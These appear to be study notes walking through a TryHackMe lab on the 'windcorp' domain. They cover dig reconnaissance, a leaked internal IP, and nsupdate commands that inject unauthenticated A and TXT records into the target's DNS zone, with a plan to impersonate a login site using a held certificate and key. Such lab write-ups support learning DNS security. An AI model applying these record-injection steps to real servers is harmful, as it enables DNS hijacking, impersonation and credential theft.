This is part of a lesson about **insecure dynamic DNS updates** (where anyone can modify DNS records if security is misconfigured).

You can try with:
- Zone transfers (`dig AXFR windcorp.thm @fire.windcorp.thm`)
- Dynamic DNS updates (`nsupdate`)

---
## Zone transfers

The popup login page is on: **selfservice.windcorp.thm**.

#Attacking_machine 
```
dig selfservice.windcorp.thm @<MACHINE IP>
```

![[DNS exploitation-20250905111019689.webp]]

### Key Sections

#### ✅ HEADER

`status: NOERROR`

- Means the query succeeded, the server had a valid answer.

---

#### ✅ QUESTION

`;selfservice.windcorp.thm. IN A`

- You asked for an **A record** (IP address) of `selfservice.windcorp.thm`.

---
#### ✅ ANSWER

`selfservice.windcorp.thm. 3600  IN  CNAME   fire.windcorp.thm. fire.windcorp.thm.        3600  IN  A       10.10.183.255 fire.windcorp.thm.        3600  IN  A       192.168.112.1`

- `selfservice.windcorp.thm` is a **CNAME (alias)** → it points to `fire.windcorp.thm`.

- `fire.windcorp.thm` has **two A records**:
    - `10.10.183.255` (likely the external TryHackMe target machine)
    - `192.168.112.1` (an **internal/private IP** on the corporate LAN)


So, when you resolve `selfservice.windcorp.thm`, it’s basically an alias for `fire.windcorp.thm`, which can resolve to either external or internal IPs.

---

#### ✅ What this means

- You’ve discovered that **selfservice.windcorp.thm** is not its own server — it’s an alias for **fire.windcorp.thm**.
    
- The DNS server is **leaking an internal IP (192.168.112.1), which is sensitive info.
    
    - This is a common misconfiguration in real environments: exposing internal addressing via DNS.
        
- The **external service** you can reach is at **10.10.183.255** (your attack target in THM).
    

---

⚡️ In a real pentest, this would tell you:

1. Try accessing `http://selfservice.windcorp.thm` → it resolves to the target IP.
    
2. The internal IP (`192.168.112.1`) might be useful later for **pivoting** or **VPN access**.
    
3. If you can query DNS further, you may find **other subdomains** that also leak internal infrastructure.

---


## Dynamic DNS updates 

`nsupdate` is a command-line tool (part of the `dnsutils` package in Kali) that lets you send **DNS update requests** to a nameserver.

This is exactly what your earlier TXT flag hinted at:

> “Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources”

That means the target DNS server (`fire.windcorp.thm / <MACHINE IP>`) might let you add or change DNS records without authentication.

#Attacking_machine 

1. First, confirm the DNS server is alive:
```
dig windcorp.thm @<MACHINE IP>
```

![[DNS exploitation-20250905114949374.webp]]

The answer section confirms it's alive.

2. Query for subdomain (`selfservice.windcorp.thm`):
```
dig selfservice.windcorp.thm @10.10.183.255
```

3. Attempt dynamic update with `nsupdate`:
```
nsupdate
> server 10.10.183.255 
> zone windcorp.thm 
> update add test.windcorp.thm 600 A 10.9.0.123 
> send
```

4. Verify:
```
dig test.windcorp.thm @10.10.183.255
```

![[DNS exploitation-20250905120034193.webp]]

If it resolves to your IP, the server accepts **unauthenticated dynamic updates** (a critical vuln).

 5. (Optional) Add a TXT record

	Sometimes CTFs hide flags in DNS TXT updates. You can test like this:
	
```
> update add hacked.windcorp.thm 600 TXT "Owned by Kali"
> send
```


Verify:
```
dig -t TXT hacked.windcorp.thm @10.10.183.255
```

![[DNS exploitation-20250905120651351.webp]]

So we can add records.

> [!Important] 
>This only works if the DNS server allows “nonsecure dynamic updates.” In real life, this is a **severe misconfiguration**

## Summing up what you know

- There is a authenticated site https://selfservice.windcorp.thm .
- We have the certificate and private key, so we could impersonate that server .
- We can alter DNS records, so impersonating.

## Diagram

            +------------------------+
            | windcorp.thm (domain) |
            +------------------------+
                      |
                      | NS
                      v
           +-----------------------+
           | fire.windcorp.thm     |
           | (Authoritative NS)    |
           | A: 10.10.183.255      |
           | A: 192.168.112.1      |
           +-----------------------+
             |            |
   CNAME      |            | Dynamic Update?
             v            v
+-------------------+  +--------------------+
| selfservice       |  | test / hacked /    |
| .windcorp.thm     |  | other subdomains   |
| CNAME -> fire...  |  +--------------------+
+-------------------+

Other hosts (potential):
- dev.windcorp.thm -> 192.168.112.x
- mail.windcorp.thm -> 10.10.183.255
- …etc
